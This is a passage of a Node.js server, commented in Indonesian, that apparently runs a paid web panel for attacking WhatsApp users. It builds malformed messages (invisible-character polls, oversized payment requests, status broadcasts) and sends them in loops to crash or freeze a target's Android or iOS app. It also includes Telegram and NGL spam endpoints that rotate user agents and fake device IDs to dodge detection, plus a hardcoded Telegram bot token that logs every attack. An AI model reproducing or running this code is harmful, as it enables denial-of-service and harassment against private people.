      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function pollTrash(target) {
            const options = [
                { optionName: "\u2000 X \u2000" },
                { optionName: "\u2000 X \u2000" },
                { optionName: "\u2000 X \u2000" }
            ];
            
            const correctAnswer = options[1];
       
            const msg = generateWAMessageFromContent(target, {
                botInvokeMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32), 
                            messageAssociation: {
                                associationType: 7,
                                parentMessageKey: crypto.randomBytes(16)
                            }
                        }, 
                        pollCreationMessage: {
                            name: "🩸 YT JustinOfficial-ID ", 
                            options: options,
                            selectableOptionsCount: 1,
                            pollType: "QUIZ",
                            correctAnswer: correctAnswer
                        }
                    }
                }
            }, {});
            
            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target },
                userJid: target,
            });
         
          const buttonsPayload = {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: { text: "\u2000" },
                  nativeFlowMessage: {
                    buttons: [
                      { 
                        name: "single_select", 
                        buttonParamsJson: "\u2000" 
                      },
                      { 
                        name: "form_message",
                        buttonParamsJson: JSON.stringify({
                          icon: "DEFAULT",
                          flow_cta: "\u2000",
                          flow_message_version: "3"
                        })
                      }
                    ]
                  }
                }
              }
            }
          };
          
          await sock.relayMessage(target, buttonsPayload, {
            messageId: null,
            participant: { jid: target },
            userJid: target,
          });
          
          let p = "\u2000".repeat(1500);
          const payload = {
            requestPaymentMessage: {
              currencyCodeIso4217: 'IDR',
              requestFrom: target, 
              expiryTimestamp: Date.now() + 8000, 
              amount: {
                value: 999999999, 
                offset: 100, 
                currencyCode: 'IDR'
              },
              contextInfo: {
                externalAdReply: {
                  title: " ",
                  body: p,
                  mimetype: 'audio/mpeg',
                  caption: p,
                  showAdAttribution: true,
                  sourceUrl: null,
                  thumbnailUrl: null
                }
              }
            }
          };
          
          await sock.relayMessage(target, payload, {
            participant: { jid: target },
            messageId: null,
            userJid: target
          });
        }

// INI BUAT BUTTON DELAY 50% YA ANJINKK@)$+$)+@((_
async function delaylow(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delaylow');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 30) {
        await Promise.all([
          protocolbug19(sock, X),
          GarxDelayDrain(sock, X),
          sleep(500)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// INI BUAT BUTTON DELAY 100% YA ANJINKK@)$+$)+@((_
async function delayhigh(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delayhigh');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 50) {        
        await Promise.all([
          protocolbug18(sock, X),
          BandangV1(sock, X),
          bandangV2(sock, X),
          sleep(2000)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/50 delayhigh 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// INI BUAT BUTTON ANDROID BLANK
async function androkill(sock, target) {
     for (let i = 0; i < 3; i++) {
         await pollTrash(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
// INI BUAT BUTTON BLANK IOS
async function blankios(sock, target) {
     for (let i = 0; i < 1; i++) {
         await PouButtonUi(sock, target);
         await iosinVisFC3(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// INI BUAT BUTTON IOS INVISIBLE
async function fcios(sock, target) {
     for (let i = 0; i < 50; i++) {
         await iosinVisFC3(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// INI BUAT BUTTON FORCE CLOSE MMEK LAH MASA GA TAU
async function forklos(sock, target) {
     for (let i = 0; i < 3; i++) {
         await crashGroupx(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// Middleware untuk parsing JSON
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  
  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }
  
  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "Glory", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "Glory", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  // Ambil username, key, dan data device yang dikirim dari form
  const { username, key, device_id, device_info } = req.body;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username && u.key === key);
  
  if (userIndex === -1) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  const user = users[userIndex];

  // --- LOGIKA 1 AKUN 1 DEVICE ---

  // 1. Jika User belum punya Device ID terdaftar di database (Login Pertama)
  if (!user.registered_device) {
    user.registered_device = device_id; // Kunci ID perangkat ini
    user.device_meta = device_info;     // Simpan spek perangkat (OS/Browser)
    
    // Simpan perubahan ke file JSON/Database Anda
    saveUsers(users); 
  } 
  
  // 2. Jika sudah terdaftar, bandingkan ID perangkat yang masuk dengan yang terdaftar
  else if (user.registered_device !== device_id) {
    // Jika ID Berbeda, blokir akses
    return res.redirect("/login?msg=" + encodeURIComponent("ACCESS_DENIED: Akun tertaut di perangkat lain!"));
  }

  // --- LOGIN BERHASIL ---
  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 }); 
  res.redirect("/dashboard");
});

// Tambahkan auth middleware untuk WiFi Killer
// Route untuk dashboard

app.get("/dashboard", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "dashboard.html"); // atau file lain jika ada
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file dashboard:", err);
      return res.status(500).send("File dashboard tidak ditemukan");
    }
    res.send(html);
  });
});

// Endpoint untuk mendapatkan data user dan session
app.get("/api/option-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  // Ambil role dari data user
  const userRole = currentUser.role || 'user';

  // Format expired time
  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  // Hitung waktu tersisa
  const now = Date.now();
  const timeRemaining = currentUser.expired - now;
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

  res.json({
    username: currentUser.username,
    role: userRole,
    activeSenders: sessions.size,
    expired: expired,
    daysRemaining: daysRemaining
  });
});

app.get("/profile", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "profil.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/tiktok", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/chatai", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "chat.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/spam", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "telegram-spam.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/sender", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/chat", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "Chatai.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/nsfw", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "nsfw.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/anime", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "anime.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/tools", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "tools.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/ping", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "wifi.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/yt", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "YouTube.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/osint", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "nikparse.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/tqto", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "tq.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/ngl", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "ngl.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/pin", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "pinterest.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/grup", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Glory", "chatpublic.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
      
/* 
USER DETECTIONS - HARAP DI BACA !!!
MASUKIN BOT TOKEN TELE LU DAN ID TELE LU ATAU ID GROUP TELEL LU

Gunanya buat apa bang?
itu kalo ada user yang make fitur bug nanti si bot bakal ngirim log history nya ke id telelu, kalo pake id GC tele lu, nanti ngirim history nya ke GC tele lu bisa lu atur aja mau ngirim nya ke mana ID / ID GC
*/
const BOT_TOKEN = "8600140277:AAEgIgJjV76-oit1ciAOw69KAQGFaaCwzT8";
const CHAT_ID = "7552335798";
// simpan waktu terakhir eksekusi (global cooldown)
let lastExecution = 0;

// INI JANGAN DI APA APAIN
app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;

    // Jika tidak ada username, redirect ke login
    if (!username) {
      return res.redirect("/login?msg=Silakan login terlebih dahulu");
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.redirect("/login?msg=Session expired, login ulang");
    }

    // Handle parameter dengan lebih baik
    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target || '';
    const mode = req.query.mode || '';

    // Jika justExecuted=true, tampilkan halaman sukses
    if (justExecuted && targetNumber && mode) {
      const cleanTarget = targetNumber.replace(/\D/g, '');
      const country = getCountryCode(cleanTarget);
      
      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed - ${country}`
      }, false, currentUser, "", mode));
    }

    // Ambil session user yang aktif
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));
    
    console.log(`[INFO] User ${username} has ${activeUserSenders.length} active senders`);

    // Tampilkan halaman execution normal
    return res.send(executionPage("🟥 Ready", {
      message: "Masukkan nomor target dan pilih mode bug",
      activeSenders: activeUserSenders
    }, true, currentUser, "", mode));

  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

// INI BUAT PANGILAN KE FUNGSINYA
app.post("/execution", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { target, mode } = req.body;

    if (!target || !mode) {
      return res.status(400).json({ 
        success: false, 
        error: "Target dan mode harus diisi" 
      });
    }

    // Validasi format nomor internasional
    const cleanTarget = target.replace(/\D/g, '');
    
    // Validasi panjang nomor
    if (cleanTarget.length < 7 || cleanTarget.length > 15) {
      return res.status(400).json({
        success: false,
        error: "Panjang nomor harus antara 7-15 digit"
      });
    }

    // Validasi tidak boleh diawali 0
    if (cleanTarget.startsWith('0')) {
      return res.status(400).json({
        success: false,
        error: "Nomor tidak boleh diawali dengan 0. Gunakan format kode negara (contoh: 62, 1, 44, dll.)"
      });
    }

    // Cek session user
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));

    if (activeUserSenders.length === 0) {
      return res.status(400).json({
        success: false,
        error: "Tidak ada sender aktif. Silakan tambahkan sender terlebih dahulu."
      });
    }

    // Validasi mode bug
    const validModes = ["delay", "blank", "medium", "blank-ios", "fcinvsios", "force-close"];
    if (!validModes.includes(mode)) {
      return res.status(400).json({
        success: false,
        error: `Mode '${mode}' tidak valid. Mode yang tersedia: ${validModes.join(', ')}`
      });
    }

    // Eksekusi bug
    const userSender = activeUserSenders[0];
    const sock = sessions.get(userSender);
    
    if (!sock) {
      return res.status(400).json({
        success: false,
        error: "Sender tidak aktif. Silakan periksa koneksi sender."
      });
    }

    const targetJid = `${cleanTarget}@s.whatsapp.net`;
    const country = getCountryCode(cleanTarget);

    // HATI² HARUS FOKUS KALO MAU GANTI NAMA FUNGSI NYA
    let bugResult;
    try {
      if (mode === "delay") {
        bugResult = await delaylow(sock, 24, targetJid);
      } else if (mode === "medium") {
        bugResult = await delayhigh(sock, 24, targetJid);
      } else if (mode === "blank") {
        bugResult = await androkill(sock, targetJid);
      } else if (mode === "blank-ios") {
        bugResult = await blankios(sock, targetJid);
      } else if (mode === "fcinvsios") {
        bugResult = await fcios(sock, targetJid);
      } else if (mode === "force-close") {
        bugResult = await forklos(sock, targetJid);
      }

      // Kirim log ke Telegram
      const logMessage = `<blockquote>⚡ <b>New Execution Success - International</b>
      
👤 User: ${username}
📞 Sender: ${userSender}
🎯 Target: ${cleanTarget} (${country})
📱 Mode: ${mode.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: logMessage,
        parse_mode: "HTML"
      }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

      // Update global cooldown
      lastExecution = Date.now();

      res.json({ 
        success: true, 
        message: "Bug berhasil dikirim!",
        target: cleanTarget,
        mode: mode,
        country: country
      });

    } catch (error) {
      console.error(`[EXECUTION ERROR] User: ${username} | Error:`, error.message);
      res.status(500).json({
        success: false,
        error: `Gagal mengeksekusi bug: ${error.message}`
      });
    }

  } catch (error) {
    console.error("❌ Error in POST /execution:", error);
    res.status(500).json({
      success: false,
      error: "Terjadi kesalahan internal server"
    });
  }
});

// Route untuk serve HTML Telegram Spam

// API endpoint untuk spam Telegram
app.post('/api/telegram-spam', async (req, res) => {
    try {
        const username = req.cookies.sessionUser;
        if (!username) {
            return res.json({ success: false, error: 'Unauthorized' });
        }

        const { token, chatId, count, delay, mode } = req.body;
        
        if (!token || !chatId || !count || !delay || !mode) {
            return res.json({ success: false, error: 'Missing parameters' });
        }

        // Validasi input
        if (count > 1000) {
            return res.json({ success: false, error: 'Maximum count is 1000' });
        }

        if (delay < 100) {
            return res.json({ success: false, error: 'Minimum delay is 100ms' });
        }

        // Protected targets - tidak boleh diserang
        const protectedTargets = ['@ohyeahking', '7552335798'];
        if (protectedTargets.includes(chatId)) {
            return res.json({ success: false, error: 'Protected target cannot be attacked' });
        }

        // Kirim log ke Telegram owner
        const logMessage = `<blockquote>🔰 <b>New Telegram Spam Attack</b>
        
👤 User: ${username}
🎯 Target: ${chatId}
📱 Mode: ${mode.toUpperCase()}
🔢 Count: ${count}
⏰ Delay: ${delay}ms
🕐 Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: logMessage,
                parse_mode: "HTML"
            });
        } catch (err) {
            console.error("Gagal kirim log Telegram:", err.message);
        }

        // Return success untuk trigger frontend
        res.json({ 
            success: true, 
            message: 'Attack started successfully',
            attackId: Date.now().toString()
        });

    } catch (error) {
        console.error('Telegram spam error:', error);
        res.json({ success: false, error: 'Internal server error' });
    }
});

// ============================================
const userTracking = {
  requests: new Map(), // Track per user
  targets: new Map(),  // Track per target
  
  // Reset otomatis tiap 24 jam
  resetDaily() {
    this.requests.clear();
    this.targets.clear();
    console.log('🔄 Daily tracking reset');
  },
  
  // Cek apakah user sudah melebihi limit harian
  canUserSend(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    return current + count;
  },
  
  // Cek apakah target sudah melebihi limit harian
  canTargetReceive(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    return current + count;
  },
  
  // Update counter setelah berhasil kirim
  updateUser(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    this.requests.set(key, current + count);
  },
  
  updateTarget(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    this.targets.set(key, current + count);
  },
  
  // Lihat statistik user
  getUserStats(userId) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    return this.requests.get(key) || 0;
  },
  
  // Lihat statistik target
  getTargetStats(target) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    return this.targets.get(key) || 0;
  }
};

// Auto-reset setiap 24 jam (midnight)
setInterval(() => {
  const now = new Date();
  if (now.getHours() === 0 && now.getMinutes() === 0) {
    userTracking.resetDaily();
  }
}, 60000); // Cek tiap 1 menit

// ============================================
// FUNGSI NGL SPAM - UPDATED
// ============================================
async function nglSpam(target, message, count) {
  const logs = [];
  let success = 0;
  let errors = 0;

  console.log(`🔍 Starting NGL spam to ${target}, message: ${message}, count: ${count}`);

  const sendNGLMessage = async (target, message, attempt) => {
    // Enhanced form data dengan field tambahan
    const formData = new URLSearchParams();
    formData.append('username', target);
    formData.append('question', message);
    formData.append('deviceId', generateEnhancedUUID());
    formData.append('gameSlug', '');
    formData.append('referrer', '');
    formData.append('timestamp', Date.now().toString());

    // Random delay yang lebih realistis
    if (attempt > 1) {
      const randomDelay = Math.floor(Math.random() * 4000) + 2000; // 2-6 detik
      await new Promise(resolve => setTimeout(resolve, randomDelay));
    }

    // Enhanced user agents
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
    ];
    
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    try {
      console.log(`🔍 Attempt ${attempt} to ${target}`);
      
      const response = await axios.post('https://ngl.link/api/submit', formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'User-Agent': randomUserAgent,
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Origin': 'https://ngl.link',
          'Referer': `https://ngl.link/${target}`,
          'X-Requested-With': 'XMLHttpRequest',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin'
        },
        timeout: 15000,
        validateStatus: function (status) {
          return status >= 200 && status < 500; // Terima semua status kecuali server errors
        }
      });

      console.log(`🔍 Response status: ${response.status}, data:`, response.data);

      // Enhanced response handling
      if (response.status === 200) {
        if (response.data && response.data.success !== false) {
          success++;
          logs.push(`[${attempt}/${count}] ✅ Berhasil dikirim ke ${target}`);
          return true;
        } else {
          errors++;
          logs.push(`[${attempt}/${count}] ⚠️ Response tidak valid: ${JSON.stringify(response.data)}`);
          return false;
        }
      } else if (response.status === 429) {
        errors++;
        logs.push(`[${attempt}/${count}] 🚫 Rate limited - tunggu beberapa saat`);
        // Tunggu lebih lama jika rate limited
        await new Promise(resolve => setTimeout(resolve, 10000));
        return false;
      } else {
        errors++;
        logs.push(`[${attempt}/${count}] ❌ HTTP ${response.status}: ${response.statusText}`);
        return false;
      }
    } catch (error) {
      errors++;
      console.error(`🔍 Error in attempt ${attempt}:`, error.message);
      
      if (error.response) {
        logs.push(`[${attempt}/${count}] ❌ HTTP ${error.response.status}: ${error.response.data?.message || error.response.statusText}`);
      } else if (error.request) {
        logs.push(`[${attempt}/${count}] ❌ Network Error: Tidak dapat terhubung ke server NGL`);
      } else {
        logs.push(`[${attempt}/${count}] ❌ Error: ${error.message}`);
      }
      
      return false;
    }
  };

  // Enhanced UUID generator
  function generateEnhancedUUID() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substr(2, 9);
    return `web-${timestamp}-${random}`;
  }

  // Validasi input
  if (!target || !message || count <= 0) {
    throw new Error('Input tidak valid');
  }

  if (count > 50) { // Kurangi limit untuk menghindari detection
    throw new Error('Maksimal 50 pesan per request untuk menghindari detection');
  }

  // Jalankan spam
  logs.push(`🚀 Memulai spam ke: ${target}`);
  logs.push(`📝 Pesan: ${message}`);
  logs.push(`🔢 Jumlah: ${count} pesan`);
  logs.push(`⏳ Delay: 2-6 detik random antar pesan`);
  logs.push(`─`.repeat(40));

  for (let i = 0; i < count; i++) {
    const result = await sendNGLMessage(target, message, i + 1);
    
    // Jika rate limited, berhenti sementara
    if (i > 0 && i % 10 === 0) {
      logs.push(`⏸️  Istirahat sebentar setelah ${i} pesan...`);
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }

  logs.push(`─`.repeat(40));
  logs.push(`📊 SELESAI! Sukses: ${success}, Gagal: ${errors}`);

  return { success, errors, logs };
}

// Helper function untuk generate UUID
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// ============================================
// ROUTE NGL SPAM WEB - UPDATED dengan Info Limit
// ============================================

// ==================== NGL SPAM ROUTE ==================== //

// ============================================
// API ENDPOINT - UPDATED dengan Tracking System
// ============================================


// ✨ BONUS: Endpoint untuk cek target

app.post("/api/ngl-spam-js", requireAuth, async (req, res) => {
  const { target, message, count } = req.body;
  
  // Ambil user ID dari IP atau cookie
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  // Hard limits
  const limits = {
    maxPerRequest: 100,      // Max 100 pesan per request
    minDelay: 3000,          // Minimal delay 3 detik
    maxDailyPerUser: 200,    // Max 200 pesan per user per hari
    maxDailyPerTarget: 100   // Max 100 pesan ke target yang sama
  };
  
  if (!target || !message || !count) {
    return res.status(400).json({ error: "Semua field harus diisi" });
  }

  // ✅ VALIDASI 1: Cek count tidak melebihi maxPerRequest
  if (count > limits.maxPerRequest) {
    return res.status(400).json({
      error: `❌ Untuk keamanan, maksimal ${limits.maxPerRequest} pesan per request`,
      currentCount: count,
      maxAllowed: limits.maxPerRequest
    });
  }

  if (count < 1) {
    return res.status(400).json({
      error: '❌ Jumlah pesan harus minimal 1'
    });
  }

  // ✅ VALIDASI 2: Cek limit harian user
  const userTotal = userTracking.canUserSend(userId, count);
  if (userTotal > limits.maxDailyPerUser) {
    const currentUsage = userTracking.getUserStats(userId);
    return res.status(429).json({
      error: '🚫 Limit harian tercapai!',
      message: `Kamu sudah kirim ${currentUsage} pesan hari ini. Limit: ${limits.maxDailyPerUser}/hari`,
      currentUsage: currentUsage,
      dailyLimit: limits.maxDailyPerUser,
      remaining: limits.maxDailyPerUser - currentUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  // ✅ VALIDASI 3: Cek limit harian target
  const targetTotal = userTracking.canTargetReceive(target, count);
  if (targetTotal > limits.maxDailyPerTarget) {
    const currentTargetUsage = userTracking.getTargetStats(target);
    return res.status(429).json({
      error: '🚫 Target sudah menerima terlalu banyak pesan!',
      message: `Target ${target} sudah terima ${currentTargetUsage} pesan hari ini. Limit: ${limits.maxDailyPerTarget}/hari`,
      currentTargetUsage: currentTargetUsage,
      targetDailyLimit: limits.maxDailyPerTarget,
      remaining: limits.maxDailyPerTarget - currentTargetUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  try {
    // Kirim pesan
    const result = await nglSpam(target, message, parseInt(count));
    
    // ✅ UPDATE TRACKING setelah berhasil
